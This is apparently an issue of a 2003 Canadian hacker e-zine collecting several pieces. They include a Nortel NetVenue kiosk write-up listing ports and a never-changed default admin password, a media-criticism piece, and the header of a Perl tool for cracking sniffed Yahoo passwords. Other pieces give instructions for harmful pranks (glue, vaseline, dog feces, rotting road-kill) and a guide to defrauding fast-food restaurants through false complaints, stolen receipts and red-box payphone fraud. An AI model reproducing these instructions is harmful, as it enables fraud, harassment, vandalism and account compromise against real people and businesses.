 For those of you who have been trying to reach GHU.CA for the past several days
 without any luck, it's because Magma (its founder and webmaster) has switched
 over from a shitty host, to hosting from StealThisComputer.org! Yes, that is
 correct. Our good pal Wizbone has graciously adopted ghu.ca and given it a

 [ Toronto 2600 News - NOR/\D Radio ]

 By: Caesium

 http://www.to2600.org/norad.php

 NORAD Radio is a new internet weekly radioshow idea conceptualized
 from myself, caesium.

 The show will feature a panel of Toronto 2600 members, with frequent
 appearances by The Clone. The show will be hosted by dec0de, produced
 by caesium and infrastructure engineering by grinthock. We plan to
 discuss relevant issues to the Canadian underground and various other
 interests. This show will be streamed by several volunteers using
 SHOUTcast MP3 streaming technology (amoungst several other techno-
 logies). This biweekly radio show will also be a call-in show which
 should prove interesting. Live, uninhibited, underground.

 We are sure with the right help and suggestions that we can turn this
 show into a success. We are currently designing and engineering the
 infastructure that will make this live, nationally produced radio show
 possible.

 We hope to have it pilot sometime in May or June. If you have any ideas,
 concepts or otherwise, please contact caesium at caesium@toronto2600.org.

  An Introduction to the NetVenue:

 It is believed by some that Internet Kiosks, are the future of public pay telephone.
 Despite huge profit losses by telecommunications giant by Nortel Networks which saw
 a third quarter loss of $1.8 (US) billion, has slashed its work force, and has hacked
 away at its product lines, it still continues to exist as a market leader.

 One such product that Nortel Networks has recently stopped manufacturing and licensing
 to markets (but many resellers still offer in parts of Canada and the United States)
 is the NetVenue Terminal. The NetVenue is a robust, low maintenance next-generation
 Millennium public access terminals which is used to deliver IP-based services and
 applications.

 The NetVenue is available in two platforms; the "Java Terminal" (Windows-NT based) and
 the "Mac Terminal" (MAC OS-9 / X based), and offer colour touch screens with card readers,
 receipt printers for e-commerce, a docking station enclosure house, a Debit Machine, a
 handset for POTS services, a keyboard and trackpad for Internet surfing capabilities.

 The broad classes of services most important to public IP access are currently seen as:
 Messaging services like e-mail Internet access (Web browsing), Form-entry services for
 markets such as banking and government services, Electronic Commerce applications such
 as ticketing and virtual malls, and Entertainment for gaming, online gambling, and 
 Cyber-Sex0ring in chat rooms. 

 This paper will discuss the technical aspects of this beautiful piece of technology by
 outlining and describing the hardware, the software (applications), locations, photographs,
 and more! We hope you enjoy this document, and we look forward to your feedback and updates.
 I certainly wish we could of released this document when the NetVenue was a brand new product,
 but it wasn't until recently that Magma and The Clone were able to acquire most of the details
 on it.

 [ Hardware Architecture Details ]


 Remote Administration Functions:

 All updates to the Nortel NetVenue Terminal are done through the software known
 as 'NetOp Remote Control', which is used at the carrier's NOC (Network Operations
 Centre), or at the owner's location of business. NetOp Remote Control allows the
 system administrator to control the Nortel NetVenue Terminal's keyword, mouse, and
 basic to advanced functions all via a user- friendly Windows GUI. Details on ordering
 this product are available at: this web-page.

 Be sure to request a FREE TRIAL, and try it before you buy it.
 NetOp Remote Control is quite an interesting piece of software.


 Credit Card Transactions: 

 All credit card transactions in the Nortel NetVenue are processed via the customized
 payment gateways which are completely supported by Nortel Network's Kiosk internal
 terminal software. The NetVenue uses a third-party clearinghouse to authorize and
 clear or deny credit cards for Pay-per-Use and purchases via service APIs. The Nortel
 NetVenue will communicate with the credit card clearinghouse's host over TCP/IP, and a
 proprietary protocol that is completely defined by the particular authorization company. 


 Shared Network Services: 

 - Canada -

 Shared Network Services (SNS) provides credit card authorizations in Canada. Transactions
 are configured to be automatically settled by SNS who provide a settlement file back to the
 'NetVenue Management System'. SNS also provides credit card transaction reports to the Net-
 Venue Kiosk merchant clients.

 - United States -

 NDC (formerly 'Global Payment Solutions') provides card authorizations for U.S. dollar tran-
 sactions and U.S. merchant clients. ACS provides automatic settlement for these credit card
 transactions.



 Millennium Authorization:

 Card authorizations via the Kiosk can be performed by the payphone component of the terminal
 if the Netvenue payphone is in direct communication with the Nortel 'Millennium Manager'.
 These authorizations are for fixed amounts configured on the Millennium Manager. This amount
 is also fixed across all services that use Millennium card authorizations.


 The NetVenue Smart Card Service:

 Interac Debit card support is provided by a Debit Software Component in the Java Terminal
 in conjunction with a third party device manufactured by a company known as Nova Enterprise
 Solutions. The support provides for multiple merchant debit card transactions. This means
 that more than one merchant can accept debit cards as payment on a single terminal. The
 Nova device communicates with an "IVI Vending Pad" for PIN entry and prompting. It also
 clears the debit card to the financial institution via a separate physical connection to
 the bank's secure host computer. The Vending Pad provides most of the security since it
 contains the various security keys and performs all of the encryption/decryption of messages
 sent to the particular bank. The current implementation provides basic debit card support for
 a small number of terminals due to the high costs and maintenance: each Nortel NetVenue
 terminal requires a separate PayBox and a Datapac '3201' (transaction protocol) line for NUI-
 based connections. To learn more about the Datapac system, be sure and refer to this Hack
 Canada document. 


 The NetVenue Keyboard:

 The NetVenue's keyboard kinda reminds me of the Millennium TTY Terminals found in most public
 places in Canada. The keyboard has a mouse-button near the credit card slot for moving the
 mouse cursor, and a separate clicker button. It has a QWERTY keyboard with many of the same
 keys you'd find on an average 101, and two types of data jacks; RJ-11 for dial up connections,
 and an Ethernet jack for tappin' on to the high speed with your laptop or PDA. The NetVenue
 terminal maps character keys according to the letters on the dialpad, and characters that are
 not supported such as "!" are not mapped to any input. Any keyboard buttons that are not valid,
 provide no audible response to the user. For example, if the user presses "!" on the keyboard,
 this has no effect within the GUI application.

 For a visual depiction of the keyboard, scroll down and view the photographs.



 Volume (up and down) buttons:

 You guessed it; the volume buttons are used for increasing and decreasing the volume in the
 NetVenue's handset. It doesn't affect any of the terminal's multimedia audio volume as they
 are set to a factory setting or pre-set by the administrator.


 Next Call button:

 This button acts similar to the existing Millennium payphone's "Next Call" button. The Next Call
 button different has results depending on when it's pressed. During call set up, this key acts as
 a correction. If the customer is typing in a number and they press the "Next Call" button, the
 dialed number is blanked out. If the user is on a call, pressing this key allows the user to
 initiate another call using any existing credit. The next call may also initiate additional 
 credit authorization.


 Language button:

 The language is primarily in English, unless the phone is located in places like Quebec, then it
 would be French by default. You can change the language the NetVenue displays and says (on the
 voice prompts) by pressing the Language Key once. The language service is synchronized with the
 Multimedia primary language via the "PC-to-Payphone" interface protocol. 


 Forgotten Card Alarm:

 The forgotten card alarm audible sound file is played on the PC's multimedia speakers when a card
 is left in the card reader at least 5 seconds after the customer hangs up the receiver on the Net-
 Venue. This sound file is configurable via the back-end Multimedia Server, so if you ever wanted to
 change it, you could. It would be especially entertaining to change the forgotten card alarm from
 the usual "dee-doo-dee-doo" to "hey idiot, you forgot your card in me!" :)


 Rate Table Updating:

 On a regular basis, the Nortel NetVenue will connect via POTS copper lines to the remote server
 running Millennium Manager to update its rate tables and software (for upgrades, security patches,
 etc). How does the NetVenue know when to update its records? The NetVenue software runs on a task-
 list or 'cron', and usually updates at the same time every day. Sometimes the service provider will
 set the NetVenue to dial out to the Millennium Manager at various times throughout the week or month. 



 [ Software Architecture Details ]


 Electronic Mail:

 The Nortel NetVenue has the ability to allow a user to check their e-mail through two ways; web-based
 services on the Internet (i.e. Hotmail) and through POP3. If a customer decides to check their e-mail
 through the POP3 protocol, Nortel NetVenue will politely prompt the user to enter their POP3 e-mail
 account ID and password. As soon as that information is entered, the user will then need to press the
 log on button and begin sending and receiving e-mail as well as deleting, replying to, printing (if
 applicable), moving, jumping to the next and/or previous message. However if the user messes up and
 enters either invalid login or password info, NetVenue will prompt them a few times before quitting.

 E-mail Attachments are not supported for reasons of security. Denying the user the ability to attach
 files, will significantly cut down on the chances of viruses and trojans being sent from the user.


 Service APIs:

 There are several API commands that can be used to access the NetVenue's functionality for reading
 cards, clearing cards, printing receipts, printing tickets, and dialing telephone numbers for the
 customer. For your convenience (heh), here are the API commands it uses. Remember, many of these
 commands require the Nortel NetVenue to have a laser printer installed. Don't even bother if it
 doesn't, mmmkay?


 "Print PostScript File"

 This command prints one or more PostScript files stored on the hard drive to the system laser printer.
 The Print PostScript File command is useful for printing forms such as insurance/government forms, etc.


 "Print Receipts / Coupons"

 This command (you guessed it!) prints receipts and coupons. Intriguing.


 "Print Current Web Page"

 This command prints the content of a HTML page to the system's default printer while a user is online.


 "Exit Service"

 This command will let you exit the service.


 "Print Ticket" (requires a ticket printer)

 This command lets you print tickets. Fun.


 "Dial Phone Number"

 This command by default will dial the telephone number as configured in the terminal database by the
 NetVenue administrator. One can enter any number they wish here, including extensions for voice-mail
 and/or customer service on PBX's.


 "Read, Clear Card"

 This command tells the NetVenue terminal to request that the user insert their credit / debit-card for
 transactions. Only the administrator can configure the "Result URL" in the server using the administr-
 ation tool which is user ID and password protected (set to a factory default, and never changed).


 Encryption:

 The Nortel NetVenue uses Secure Sockets Layer (SSL 128bit) over Internet transactions that is provided
 by the Internet Explorer / Netscape browsers. For Datapac based transactions, proprietary encryption
 over the data lines is used as well as encryption at the remote server. If the administrator does not
 have an SSL compatible server, the customer will NOT be able to use SSL features on the NetVenue.



 NetVenue's TCP/IP Ports & Protocols:

 The following is a list of network protocols and ports that are used by the NetVenue Terminal...


 * STCP/UDP, port 53 -- Used by the NetVenue Internet Services. Also used in the operating system,
   and Java software for the PC version of the NetVenue.

 * FTP port, 21 -- There is no FTP server is installed on the NetVenue terminal. Bunk. :-/

 * LPRTCP, port 515 -- This is used by the "Windows TCP/IP Printing Service" when printing Web pages
   from within a certain Web service and/or by the system's default laser printer.

 * BOOTP/DHCPUDP, port 68 -- Not currently enabled. 

 * Web-Server, port 80, 8080 - Used for outgoing Internet usage. 

 * TCP, port 443 (SSL) -- Used primarily by the Web service. HTTP can also use other ports, depending
   on how the web server is configured.

 * Oracle's Thin Client ODBC driver / JDBC, Port 1521 -- JDBC/TNS/SQL*net Used by the Java software
  for connections to its security database.

 * Nortel Java S/WGPS, Port 15126 -- For Global Payment Solutions for all United States credit card
   authorizations.

 * SNS, Port 1076 -- for Shared Network Services (SNS) for all Canadian credit card authorizations.

 * PAP, Port 9100 -- Uses TCP/IP sockets for printing postscript files directly from the "HTML API"
   command.

 * Timbuktu Proprietary UDP (Mac only), port 407

 * Observation, Control, File Transfers, port 1417, 1418, 1419, 1420 

 * Notification, Chat, Intercom, ports 1023. 

 * NetOp Proprietary TCP, port 6502 -- Uses a single port

  Locations in Canada:

 As far as I know, the only locations that were ever noted was the one in Toronto
 (pictures above), and one in Montreal. Both of these were services offered by Bell
 Canada. At the end of 2002, the contract that Bell had with Nortel expired. Bell
 decided not to renew the contract and decided to go with another company (King
 Products) and is now offering public services using the cc100 terminals. The cc100
 terminals are interesting, but lame in comparison to the vast features the NetVenue
 offers. Western Canada MAY still adopt the NetVenue for services; particularly by
 telephone companies such as Telus Communications. The United States is said to have
 many NetVenue terminals in use by small telecom service providers. A friend of a
 friend in New Jersey works for a company that sells these NetVenue's, so eastern USA
 is definitely utilizing these. 


 The Conclusion to this Paper:

 There you have it; the most comprehensive document you've probably ever read on the
 Nortel NetVenue Terminals. We sincerely hope you enjoyed this paper, and we hope to
 hear your feedback, and receive any tips and/or corrections.


 The future of the payphone industry appears to be that of the
 Internet Kiosk terminals. Will they last? Only time will tell.

  Reporter Comments: When a Journalist and a Prosecutor Lie to the Public


  * Date: Tuesday, April 8, 2003

  * Introduction by: The Clone

  * Web-site: WWW.NETTWERKED.NET


  This file is a continuing saga. Read the original article first.


  Introduction:

  I recently received an e-mail from a Toronto Star reporter by the name
  of Rachel Ross, who found the Nettwerked article pertaining to the
  Alberta prosecutor Steven Bilodeau, and the mis-information spread
  within the pages of the Edmonton Journal by editor Keith Gerein.
  
  She had some comments to make, and some information to share regarding
  the claim that Steven Bilodeau made regarding the Massachussetts
  teenager's apparent airport / power-grid shenanigans. So now it seems
  that the false claim Steven Bilodeau made was actually loosely based
  off of the truth. One thing though; in the Edmonton Journal article,
  Steven Bilodeau claimed that the Massachussetts teenager was able to
  shut down the power-grid and airport lighting system easily just by
  hooking onto a "switch box" with a device - it sounded all too similar
  to a lineman's handset.

  So the truth is the teenager disabled the lighting system at an airport
  and supposedly interrupted telephone service at a nearby town in Rutland.
  HOWEVER, I don't see where it says anything about disabling power, either
  than the article making a really bad analogy: "Just as disabling a circuit
  breaker box blacks out an entire house, so disabling a loop carrier system
  cuts off all communications with the telephone lines it services". Heh.

  Thanks to a REAL reporter Rachel Ross from the Toronto Star doing her homework,
  we now know that we should never take what we read in the media as absolute
  truth just because it happens to be printed word. Rachel, the Canadian hacker
  community salutes you. Steven Bilodeau, shame on you for telling lies. Keith
  Gerein, shame on you for spreading the blatant libel in a city-wide newspaper.
  Don't think you're getting off that easy, Keith; I've convinced several of my
  close friends, family members, and readers to boycott the Edmonton Journal for
  the bullshit it published!

  I want to send a special thanks to Anonymous_Hero for the original contribution
  to this story. When readers like you speak out, everyone wins.

  I found the article 'When a Journalist and a Prosecutor Lie to the Public'
  interesting and decided to look into the "tale" of the teen hacker who
  allegedly shut down the power grid and runway lights. At minimum, it sounded
  a little ridiculous. I think I know the incident that the reporter was trying
  to describe. I've pasted a news story about the incident below. It appears as
  though the teen didn't take out a power grid, but he did manage to disable a
  remote control system for some runway lights. (I guess they could still run out
  there and switch the darn lights on the runway but what a pain in the ass.)
  Anyway, I just thought your readers might be interested in the real story.

  Cheers,
  Rachel

  P.S. All reporters do not suck. No really, we don't.
       Well, some of us TRY not to anyway.


 Teen hacker charged with disabling airport control tower telephones
 18 March 1998

 BOSTON, March 18 (AFP) - A teenage computer hacker was charged Wednesday
 with disabling telephones and control tower services at a Massachussetts
 airport, the Justice Department said.

 The incident last spring virtually shut down the Worcester, Massachussetts
 airport, and also interrupted phone service in the nearby town of Rutland.

 The lead federal investigator on the case, Secret Service Special Agent
 Michael Johnston said the case was one of the agency's "most significant
 computer fraud investigations," and had significant "national security
 ramifications."

 The charges unsealed Wednesday were the first brought by the federal government
 against a juvenile for computer crimes. "Computer and telephone networks are at
 the heart of vital services provided by the government and private industry, and
 our critical infrastructure. They are not toys for the entertainment of teenagers,"
 said US Attorney Donald Stern, in a press release.

 "Hacking a computer or telephone network can create a tremendous risk to the public
 and we will prosecute juvenile hackers in appropriate cases, such as this one," Stern
 said. Under a plea agreement, prosecutors said the youth would receive two years'
 probation, during which he will not be allowed to own or use a computer modem. He must
 also pay restitution to the phone company and perform 250 hours of community service.

 Officials did not release the name of the youth because of his age. Prosecutors said
 the incident occurred March 10, 1997, when the teenager hacked into remote computers
 called "loop carrier systems" that move voice and data transmissions from older copper
 telephone lines to more sophisticated fiber-optic cables.

 "Just as disabling a circuit breaker box blacks out an entire house, so disabling a
 loop carrier system cuts off all communications with the telephone lines it services,"
 Stern explained.

 Worcester Airport in eastern Massachusetts had no telephone service for six hours, nor
 did the airport's fire department or security system, the statement said. A remote
 control systems operating runway lights also failed.

 On the same day, the teenager also broke into a Worcester pharmacy computer and ordered
 it to transmit to his computer information on all prescriptions filled the previous week.

     First Data and Concorde - The World's Biggest Banks Merge
		
     
    CORPORATE NAME        VOLUME BY STOCK       DOLLAR

    First Data            23,697,300            813.1
    Concord Efs INC       49,925,900            620.3
    IBM                   7,280,100             593.0
    Citigroup             15,058,000            555.3
    Altria Group          18,425,500            538.4

 These were the top 5 stocks at close of April 2, 2003 on the
 New York Stock Exchange.  This might not be of issue to anyone,
 but the top two companies on this list merged today.  These
 companies are not IT, or even arms related.  This merger
 announced today was of the two largest banking conglomerates
 in the world.

 First Data owns Western Union, and processes 7 out of every
 10 credit card transactions in the world.  Concord was their
 rival until a few hours ago.  The banking world is not unlike
 the Internet.  There are only 3 bank "backbones" that all other
 banks lease their access to Visa and Mastercard through.  Like
 the clergy in the Catholic church, if you need to speak to God,
 or get a credit card authorized, you do it through them.

 Today's merger cuts this down to two.  With the American people
 so caught up in the war, perhaps these banks believe no one is
 paying attention to Anti-trust legislation and homing in on the
 plight of the recently rescued Jessica Lynch instead.

 The new First Data is slated to generate $10 Billion in annual
 revenue.  In an article with Reuters, First Data Chief Executive
 Charlie Fote said he was confident the deal would clear those
 hurdles. "We feel pretty good about the antitrust issue,".
 I think Bill Gates said the same thing once upon a time.

 [ Perl Code for Security Auditing Yahoo E-mail Passwords ]

 
 #!/usr/bin/perl
#   
#    By: GrassMunk
#
#   	||Info//Background||
#        This program uses a dictionary file to crack sniffed yahoo passwords.
#        ( like those seen from Dsniff )
#        
#        //Code from Yahoo login page
#        var passwd = form.passwd.value;
#              var hash1 = MD5(form.passwd.value);
#              var challenge = form[".challenge"].value;
#              var hash2 = MD5(form.passwd.value) + challenge;
#              var hash;
#              if(form.passwd.value){
#                hash=MD5(hash2);
#              }
#        as you can see the above code is used to create a hash value for
#        your password so that  its not sent  plaintext over the internet. 
#        This is great, but  scince we want to know  what the clear  text 
#        password is we use this program to calculate it.
#
#        OK, next you may say "Why would i use this when MD5 Crack programs
#        exist?" Well smart ass ill tell you why, you see that extra "+ challenge"
#        up there, its adding a "nonce" (look it up) to add an extra level of
#        'security'. What this means is that MD5 Crack won't work because it
#        doesnt use the nonce to crack the MD5 password.
#
#	||Usage||
#	 ./YahooPWD.pl -p <sniffed pwd> -c <challenge> -d <dictionary file>
#
#        ||Note|| 
#         The dictionary file must have each individual word on a seperate line. 
#         A good example are the files from:
#	  http://www.mirrors.wiretapped.net/security/info/reference/wordlists/ 
#	  It will not work properlly if the words are all on one line and are
#	  seperated by a coma, space etc.
#
#
#     	||DISCLAIMER||
#	 This program comes with NO guaruntee ( or spell checker ). You are 
#	 free to use it however you want but I don't guaruntee that it will
#	 work forever. Infact it wouldn't take much on Yahoos' side to make 
#	 this script unusable. Also, if this script causes ANY harm to your 
#	 computer I can in no way  be held responsible. Youve gotta be some 
#	 kind of stupid to be able to  break your hardware with this little
#	 script. But I  cannot be blamed for  anything you do so don't even
#	 bother.

  :           Y      \
   \           \      \    Well, I was at a mall with a peep. We brought along
    \           \      \   a twonie and a thing of super glue (krazy glue). We
     \           \      \  proceeded to glue this coin to the floor. Holding
the coin to the floor under my shoe for several minutes until I was satified
that said coin was a new addition to what is the floor. Once that fucker was
cemented to the floor, we retired to a near-by bench to sit, watch and enjoy
our orange julius smoothies. We were soon not disapointed.

Several people came by, spent a few minutes trying to pick it up, then kick it
in a cheap attempt to get the coin unstuck. Some instantly knew it was a total
fucking joke and looked around then left with some of their pride still intact.
Others spent several minutes and one cheap fucker actually tryed to pry it off
the floor with what looked like his car key. Eventually they all gave up.

Except for this one pudgy motherfucker. This fucking sad excuse for a cheap
human being spent ten long minutes doing everything in his power to pry this
coin up, except use his fucking teeth. He soon left. Then, in total disbelief
he returns like 15-20 minutes later just as we were about to leave, with a
fucking hammer. Picture this, a fat kid, in a mall, with a hammer, smacking a
glued down twonie. Well, he got his fucking twonie, at the cost of what was
pride and common sense. And this kid was fucking 14 to 16.. It was indeed a
sad moment for the human race. And was pretty damn funny at that.

This is what its all about people. Making sensible people do unsensable things.
Not to say that, that dumb fuck was in any way sensible to begin with. Anyhow,
I digress.

-=[ Ideas ]=-

These ideas have been time tested and are true. They work.. (cept the cocktail)

*Stickey things in unexpected places
  Vaseline behind a door handle of a shop or apartment lobby door can be quite
  the unexpected surprise to your neighbours or any other fucker you dont much
  appreciate. If it moves, GLUE IT.. Nothing pisses people off more than
  something which should move, but doesnt.. If its a lock, GLUE IT. If its a
  button, RUB SHIT ON IT. If you have a dog, YOU MUST WHIP IT. WHIP IT GOOD!

*Disgusting porn in unexpected places
  Here's what I did once at a friends building. We printed off some she-male
  porn, yah know. Chicks with dicks.. Full page, Black and white and a color
  one before my buddies color ink ran out. We folded it up. And scattered it
  all about his apartment lobby. We then watched the lobby security cam via
  channel 74 on his cable (which provided more entertainment than I can
  possibly tell in even 2 k-1ine's). We saw some kids come by, pick it up, toss
  it to the ground and leave. Then we eventually saw some chienese guy pickup
  this disgusting shit, and then do what can only be described as appreciating
  the fine qualities of these penis toting biatches. His eyes then shifted from
  left to right, and so several times to ensure the coast was clear. This
  obviously indecates he knows damn well he is a suck motherfucker. Then he
  folded the print-out up and put it in his pocket. By this time, I have
  already soiled myself in what was the best laugh Ive had all damn month.

*Ordering Pizza's to Rival Pizza Places
  One night coercion, grinthock and myself were rather bored and chillin out
  at grints place. We had a few drinks, so we were feeling pretty flexible. And
  we were looking for some mild entertainment. We then decided to lodge several
  prank calls to a popular pizza chain in Ontario. Then it occured to us to
  order a pizza from one pizza place to another rival pizza place. So, we
  got 2 pizza places and their respective addresses. We then called place A and
  ordered a pizza to be delivered to place B. After that, we called Place B and
  ordered a pizza to be delivered to place A. So, A will deliver to B and B to
  A. This may seem stupid now, however, when your 3/4 drunk this is indeed a
  very very fucking funny ass thing to do. Esp, when you call up 45 minutes
  later and demand to know where the fuck your pie is. And for shits and
  giggles. Launch this over your cell phone as your walking to the place to get
  a slice. Then you can watch it all go down while having dinner.. Talk about
  free entertainment. Be sure to block your number. But that goes without
  saying.. right??

*Good Old Dog Shit in a Purse!
  YES this is old. Yes this is soo fucking well known.. But damn, it works like
  90% of the time. Its sooo fucking funny.. And everyones grandmother has
  atleast like 4 fucking purses laying around just waiting for your
  entertainment. If you cant find any dog shit. Well, grab a copy of k-1ine and
  go fill that fucker up. Or just use something equally disgusting. For ideas
  you can contact Phlux, he seems to have more than a few. We suggest filling
  the purse with useless items, like a compact you punked from your sister,
  some tissues (cause damn, old ladies fucking LOVE tissues) maybe some papers
  or something and maybe some chapstick. Insure that the items are ontop of the
  dog shit. So when hapless fucker looks inside, all he sees is whats expected
  from an old lady purse. That is until he reaches inside.

*Coercions Road-Kill Bonanza
  Go around, collect some road-kill. Put this shit into a garbage bag.
  Remember to double bag this bag of dead kill. After some kill is collected
  fill the bag half way with water and let it ferment and permeate into a
  delicious broth of disgust. For your own personal protection set the bag
  in a can or rubbermaid container while its stewing to prevent unwanted
  rupture. If you can set this in direct sunlight, go for it. Be sure to
  aggitate this daily. Let this fucking shit stand for 4 days to a week. max.
  Then haul the bag to a place you dont much care for or wish to fuck-up. Then
  rip this fucker open as your ass is running like a motherfucker. Run far, run
  fast, and dont stop or look back.. Suggested ripping tool is a sharp object
  taped to a stick, do not run holding this, cause this fucking rank smell will
  follow your ass.

*Fucking with Store Clerks
  Walking into a store and asking for weird things. Things which are gross.
  I mean, be creative. Here is what a friend of mine did once while we were at
  a mall. We noticed they were selling Habi-Trail. For those of you that dont
  know wtf Habi-Trail is, Its a bunch of these pipes and shit which you can
  connect to form elaborate yet cool pipe mazes for your hamster or rodent.
  In a passing comment, I mentioned they should make a Central Vacuum adapter
  for said Habi-Trail system (based on previous personal amusement). My friend
  decided to go into the store and ask for this non-existant accessory. So, he
  walks in, walks up to the counter and poses the million dollar question. The
  clerk stands there for a second thinking, as if she thought it was real. Then
  it suddenly occurs to her that hooking a Habi-Trail to a Central Vacuum
  system may not be in the best interests of your pet hamster. She was clearly
  an animal lover. This was made quite aparent in her recourse to said
  question. Needless to say, they did not have it in stock.

-=[ Conclusion ]=-

Fucking with peoples sensibilities can be a fun and a rewarding hobby, even if
you are totally unoriginal. Its a great way to pass boring time with the peeps
or what have you.

People are not as smart as they seem. By shaking up things a bit, you can make
normal people do some really stupid shit. This article shows a few examples in
a sea of ideas on how to fuck with unsuspecting people.

Hopefully by reading this article you will have learned a bit about
sensibilities and why you should hold them in high regard. You dont want to be
on the other end of the stick. If you see a purse on the side of the road. Keep
walking. In fact, speed up. If you see a twonie on the ground and it doesnt
respond to your shoe moving it. Then perhaps you should think nothing of it and
continue on your way. Choose not to be the cheap fat kid. Choose not to be the
victim of sensibilities.

I plan to release more articles with stories and ideas in the future. Clone
willing that is.

Anyways, Try not to physically harm or otherwise cause excessive property
damage. Dont be a complete asshole. Prove them stupid, have some jokes. But
dont totally push in their sheesh. Regarding coercions cocktail. uughh..

(Keep in mind this was written over the phone at like 6am .. we were tired
 and somewhat fucked up.. ^_^)

 Phrozen "I-know-I-fucked-up-so-shut-up" BloodFlame's Guide to Eating Free


Ok, so those of you who read last month's issue of K-1ine may have noticed
something I didn't. On the coupons that come from the change counting machines,
it says something like "One AirMile per every 20 dollars" or some other bullshit
like that.

I fucked up. My bad. At best, this trick might work to get you AirMiles at a
slightly faster rate than you normally would, at worst, it's a piece of shit.
Once again, I fucked up. Sorry.

This file is for informational purposes only, so if you decide to eat free by the
means suggested in this file, and you get e. coli or some shit, or you get busted,
or like, beaten to a bloody pulp by some burger flipping kid, it's your own damn
fault.

This one works tho... I ate for a couple of months like this. *reads disclaimer*

Um... for research. Yeah.

There are 2 ways to eat free, and both have their advantages and disadvantages.

The first way is to go to the food bank. When I went, they didn't check up on me
or anything they just took my word that I wasn't making enough money for food
(which I wasn't at the time). After that I got food from them once every couple
of months. Unfortunately, it wasn't nearly enough to last me a couple of months.
The cool thing about the food bank, tho, is that if they give you something you
don't like, they pretty much encourage you to bitch about it. Beggars can't be
choosers? Fuck that. They give you bagels, and you prefer croissants? Tell them
to give you the fucking croissants! It was great, cause you'd get enough food to
last a few weeks (between 3 and 5), and it is all stuff you like. The disadvantage
is that if you are merely hungry at 3 am, and don't have any coin, the food bank
isn't open. What is an anarch to do? He is to go to McDonald's.

If you go to McDonald's and order a number one, and they fuck it up somehow, i.e.,
it's cold, there's special sauce dripping out the side all over the place, it's not
a number one at all... what do you do? Go back and bitch about it. Bitch till they
rectify their mistake. With another number one combo. Yay! Here's the catch tho: in
times past, one merely needed to say they ordered a number one at about noon yesterday.
(How many Big Mac Combo meals do you think they sell at noon? I dunno, either, but it's
a fuckin' lot!) Now, however, you need to give a call the same day, complaining about
your order, or provide them with a receipt.

Aww, don't have a receipt? No problem, look in the parking lot. If that little pimple
farm behind the counter doesn't come out and clean the lot every few minutes there's
litter all over the place. Since they either staple the receipt to the bag, or just
shove it inside the bag, where the bag goes, the receipt goes. Look for one that's
stapled. I don't recommend reaching into the bag... that can get gross.

Another good way to get receipts is to steal them off the counter. Burger King and
Taco Bell in particular like to put receipts on the counter. I have no idea why.
All that matters is that they do. Grab two or three as you walk by. Just don't let
anyone catch you, cause sometimes large football player types get pissed off when
you steal their receipts. Personally, I'm a smoker, so I can't run very far. Just
watch yourself.

Don't feel like standing in the parking lot waiting for a receipt? Go to a payphone,
whip out your red box, and call McDonald's. Tell them that you just got home from work,
and that you stopped at McDonald's for lunch earlier, or on your way home, or whatever...
Don't tell them your order was five number 7s and a diet coke. Keep it simple. Make it
something you know they sold at the hour you are complaining about. Just happened to
hear someone order a specific order that would feed you and your friends at the drive
through? Sweet... wait fifteen minutes, and tell them they fucked up the order completely.
Come back a couple of hours later, or whatever, and get your free food. You'll be on the
"Manager's List", or "Customer's Log". Can't hear the drive through? Can't see what's on
that fucking red screen? Ok, maybe you're sitting inside, and you happen to notice someone
sitting down with his girlfriend or some shit, and they happen to be eating a number-who
fucking cares. Looks good, doesn't it? Wait till they leave. Call in. Tell them they fucked
your order. Thing is, sometimes they look it up on the 'puter they have there, and if they
didn't sell it, you don't get your food. I don't know what they can do beyond telling you
to get out, but that's cause I've never been there, cause I'm so damn good.

If you act like a first timer, tho, like you didn't know you had to call in or keep your
receipt, more often than not the chick behind the counter will tell you she can do this
for you "Just this once..." but a lot of the times they are real fuckers over the "proof"
that you bought the meal to begin with. One time, I ate one meal a day for a week at the
same location without calls or receipts. Always a different manager. Choice.

In my experience, Burger King employs only the dumbest mothercanuckers on the planet, and
they are real sticklers for having a receipt. I tried a call in there the other day, and I
was told that "I'm the night manager, so I don't know what happened today." I told her she
was a moron and that what had happened today was a bunch of people came in, ordered food,
and left. At least one left with cold food. Didn't help. Stupid fucking broad. Another time,
the bitch sat there trying to figure out how to use the computer to check the order I suppo-
sedly made. Kept asking me what time. I said I don't know the exact fucking time... it was
between 12:10 and 12:30! After getting somewhat agitated, she finally gave me my food and
let me leave. So yeah, if you do Burger King, be ready for the fucking third degree, and
if you're starving, and you can't survive without a burger in the next five minutes, hold
out for a McDonald's, cause getting Burger King to give you a fucking sandwich is like
pulling teeth for them. "Can't let the poor people take our sandwiches! We might lose
upwards of a hundred dollars a month!" Phht... this coming from a huge multinational
conglomerate who makes billions a year. Fuck'em. They write that shit off anyways.

Some of the things that help, when you are complaining:

Make it seem like you were really put out (like, "I only get one break, and I couldn't very
well come back to complain about it..." I dunno, some shit, make it seem really inconvenient
for you.

Complaining that you didn't get fries will more often than not get you an order of fries,
NOT an entire meal.

Complaining that you ordered a number one, and that you got a number seven works really well,
since "fish makes me gag."

Being upset, but not angry at the girl, cause she's just trying to do her job, and she only
gets 7 an hour. She doesn't get paid enough to put up with your shit, and if you take out
your anger on her, she will probably just tell you to get out. Unless she's really intimidated
by you. Best to be upset but polite at the same time.

One of my favourites is saying "I ordered a number one, and got a Big Extra. Yeah, I don't
know if you've ever had a Big Extra hot, but they are disgusting. Yeah, mine was cold."
And since everyone knows that Big Extras are the most disgusting burger on the planet,
chix0r might even feel sorry for you for choking down this piece of shit, then take you
out back and give you some skully.

Probably not, but she's fat anyways, so fuckit.

Don't forget to mix it up a little. Go to McDonald's today, Burger King tomorrow, then maybe
Arby's (Don't knock it, that roast beef sandwich rawks!), then hit Taco Bell, and Wendy's.
I don't recommend hitting Harvey's or any of those mom and pop burger joints, cause they
mostly make your burger custom, and if it gets all fucked up cause you don't like onions,
well, you shouldn't have told her to put onions on it.

Don't show up to the same restaurant on the same day of the week at the same time every week.
Remember, this is a workplace. The manager you encountered on Monday at 5 pm will more than
likely be there next Monday at 5 pm. She WILL catch on if you are there every Monday at 5.
Mix it up.

And there you have it... my poor attempt at rectifying last month's embarrassment of a file...
GO! Eat! Drink! Be Merry! Start a fire! Steal a car! Run over an old lady! Quit buggin' me
about my last file!

  Wired News: "Voicemail Hackers Phone It In"

  02:00 AM Apr. 17, 2003 PT

  http://www.wired.com/news/infostructure/0,1377,58517,00.html


 Voicemail passwords are being transformed into all-access backstage passes that allow
 malicious hackers to exploit voicemail systems, racking up huge charges on their unlucky
 victims' phone bills.

 Hackers are exploiting a combination of automated operator services from AT&T, voicemail
 services from SBC Communications and consumers who haven't changed their default voicemail
 passwords.

